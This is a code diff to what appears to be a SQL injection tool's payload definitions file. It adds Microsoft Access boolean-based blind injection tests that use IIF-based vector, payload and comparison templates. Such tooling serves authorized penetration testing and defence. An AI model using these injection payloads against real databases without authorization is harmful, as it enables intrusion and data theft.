@@ -727,7 +727,25 @@ Formats:
         </details>
     </test>
 
-    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
+    <test>
+        <title>Microsoft Access boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
+        <request>
+            <payload>IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
+        </request>
+        <response>
+            <comparison>IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+    <!-- TODO: check against SAP MaxDB -->
     <!-- End of boolean-based blind tests - Parameter replace -->
 
 
@@ -842,7 +860,26 @@ Formats:
             <dbms>Oracle</dbms>
         </details>
     </test>
-    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
+
+    <test>
+        <title>Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>, IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
+        <request>
+            <payload>, IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
+        </request>
+        <response>
+            <comparison>, IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+    <!-- TODO: check against SAP MaxDB -->
     <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
 
 
